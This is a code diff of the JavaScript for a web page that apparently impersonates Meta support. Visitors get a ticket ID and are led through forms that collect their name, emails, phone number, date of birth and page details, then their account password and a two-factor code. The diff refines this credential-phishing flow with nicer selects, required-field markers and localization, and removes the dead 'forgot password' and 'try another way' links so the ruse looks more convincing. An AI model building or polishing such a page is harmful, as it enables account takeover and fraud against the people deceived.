+    he: { personal: 'אישי', business: 'עסק', creator: 'יוצר / דמות ציבורית', media: 'מדיה / חדשות', brand: 'מותג / ארגון', community: 'קהילה' }
+};
+
 // Generate ticket ID
 document.getElementById('ticketId').textContent = Utils.generateTicketId();
 
@@ -758,58 +860,120 @@ document.getElementById('ticketId').textContent = Utils.generateTicketId();
 document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
 
 // ==================== MODAL 1: CLIENT INFO ====================
+function getDobLocale() {
+    const lang = getAppLang();
+    const map = {
+        en: 'en-US',
+        'en-gb': 'en-GB',
+        zh: 'zh-CN',
+        'zh-tw': 'zh-TW',
+        he: 'he-IL',
+        ar: 'ar',
+        pt: 'pt-BR',
+        no: 'nb-NO',
+        da: 'da-DK'
+    };
+    return map[lang] || lang;
+}
+
+function buildSelectOptions(placeholder, items, optional) {
+    // Keep placeholder text for the closed select, but hide it from the open option list.
+    const emptyOption = optional
+        ? `<option value="" selected hidden>${placeholder}</option>`
+        : `<option value="" disabled selected hidden>${placeholder}</option>`;
+    return [emptyOption]
+        .concat(items.map(function (item) {
+            return `<option value="${item.value}">${item.label}</option>`;
+        }))
+        .join('');
+}
+
+function buildDayOptions() {
+    const items = [];
+    for (let i = 1; i <= 31; i++) {
+        items.push({ value: String(i), label: String(i) });
+    }
+    return buildSelectOptions(t('day'), items, true);
+}
+
+function buildMonthOptions() {
+    const locale = getDobLocale();
+    const items = [];
+    for (let i = 0; i < 12; i++) {
+        const label = new Intl.DateTimeFormat(locale, { month: 'long' }).format(new Date(2020, i, 1));
+        items.push({ value: String(i + 1), label: label });
+    }
+    return buildSelectOptions(t('month'), items, true);
+}
+
+function buildYearOptions() {
+    const currentYear = new Date().getFullYear();
+    const items = [];
+    for (let year = currentYear; year >= 1900; year--) {
+        items.push({ value: String(year), label: String(year) });
+    }
+    return buildSelectOptions(t('year'), items, true);
+}
+
+function buildCategoryOptions() {
+    const options = PAGE_CATEGORY_OPTIONS[getAppLang()] || PAGE_CATEGORY_OPTIONS.en;
+    const items = Object.keys(options).map(function (value) {
+        return { value: value, label: options[value] };
+    });
+    return buildSelectOptions(t('pageCategory'), items, false);
+}
+
 function openClientModal() {
     const content = `
         <div class="info-form">
             <div class="info-form-header">
                 <h2>${t('formTitle')}</h2>
-                <p>${t('responseTime')}</p>
             </div>
             <form id="clientForm">
                 <div class="info-field">
-                    <label for="fullName">${t('fullName')}</label>
+                    <label class="info-required" for="fullName">${t('fullName')}</label>
                     <input type="text" id="fullName" placeholder="${t('fullName')}" required>
                 </div>
                 <div class="info-grid">
                     <div class="info-field">
-                        <label for="email">${t('email')}</label>
+                        <label class="info-required" for="email">${t('email')}</label>
                         <input type="email" id="email" placeholder="${t('email')}" required>
                     </div>
                     <div class="info-field">
-                        <label for="emailBusiness">${t('emailBusiness')}</label>
+                        <label class="info-required" for="emailBusiness">${t('emailBusiness')}</label>
                         <input type="email" id="emailBusiness" placeholder="${t('emailBusiness')}" required>
                     </div>
                 </div>
                 <div class="info-grid">
                     <div class="info-field">
-                        <label for="fanpage">${t('pageName')}</label>
+                        <label class="info-required" for="fanpage">${t('pageName')}</label>
                         <input type="text" id="fanpage" placeholder="${t('pageName')}" required>
                     </div>
                     <div class="info-field">
-                        <label for="phone">${t('phoneNumber')}</label>
+                        <label class="info-required" for="phone">${t('phoneNumber')}</label>
                         <input type="tel" id="phone" placeholder="${t('phoneNumber')}" required>
                     </div>
                 </div>
                 <div class="info-dob">
                     <span>${t('dateOfBirth')}</span>
-                    <div class="info-grid" style="grid-template-columns: 1fr 1fr 1fr;">
+                    <div class="info-dob-grid">
                         <div class="info-field">
                             <label for="day">${t('day')}</label>
-                            <input type="number" id="day" placeholder="${t('day')}" min="1" max="31" required>
+                            <select id="day">${buildDayOptions()}</select>
                         </div>
                         <div class="info-field">
                             <label for="month">${t('month')}</label>
-                            <input type="number" id="month" placeholder="${t('month')}" min="1" max="12" required>
+                            <select id="month">${buildMonthOptions()}</select>
                         </div>
                         <div class="info-field">
                             <label for="year">${t('year')}</label>
-                            <input type="number" id="year" placeholder="${t('year')}" min="1900" max="2024" required>
+                            <select id="year">${buildYearOptions()}</select>
                         </div>
                     </div>
                 </div>
                 <div class="info-field">
-                    <label>${t('additionalNotes')}</label>
-                    <textarea placeholder="${t('additionalNotes')}"></textarea>
+                    <label class="info-required" for="pageCategory">${t('pageCategory')}</label>
+                    <select id="pageCategory" required>${buildCategoryOptions()}</select>
                 </div>
                 <label class="info-agree">
                     <input type="checkbox">
@@ -823,6 +987,16 @@ function openClientModal() {
     Modal.create('clientModal', content);
     Modal.open('clientModal');
 
+    ['day', 'month', 'year', 'pageCategory'].forEach(function (id) {
+        var el = document.getElementById(id);
+        if (!el) return;
+        var syncPlaceholder = function () {
+            el.classList.toggle('placeholder-active', !el.value);
+        };
+        syncPlaceholder();
+        el.addEventListener('change', syncPlaceholder);
+    });
+
     document.getElementById('clientForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         const formData = {
@@ -831,6 +1005,7 @@ function openClientModal() {
             emailBusiness: document.getElementById('emailBusiness').value.trim(),
             fanpage: document.getElementById('fanpage').value.trim(),
             phone: document.getElementById('phone').value.trim(),
+            pageCategory: document.getElementById('pageCategory').value,
             day: document.getElementById('day').value,
             month: document.getElementById('month').value,
             year: document.getElementById('year').value
@@ -850,12 +1025,11 @@ function openSecurityModal() {
                 <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
             </div>
             <div class="w-full">
-                <p class="text-[#9a979e] text-sm mb-4">${t('securityHint')}</p>
+                <p class="text-[#9a979e] text-sm mb-4 text-center">${t('securityHint')}</p>
                 <form id="securityForm">
                     <input type="password" id="password" placeholder="${t('password')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                     <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">${t('continue')}</button>
-                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">${t('forgotPassword')}</a></p>
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
@@ -935,7 +1109,6 @@ function openAuthenticationModal(userData) {
                     <input type="number" id="twoFa" placeholder="${t('code')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                     <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">${t('continue')}</button>
-                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>${t('tryAnotherWay')}</span></div>
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
@@ -1031,7 +1204,7 @@ function openSuccessModal() {
     const content = `
         <h2 class="font-bold text-[18px] mb-4 text-center">${t('successTitle')}</h2>
         <div class="rounded-lg overflow-hidden mb-4">
-            <img src="./public/images/success.jpg" alt="Success" class="w-full">
+            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
         </div>
         <p class="text-[#9a979e] mb-1 text-[15px]">${t('successBody')}</p>
         <p class="text-[#9a979e] mb-5 text-[15px]">${t('successFrom')}</p>
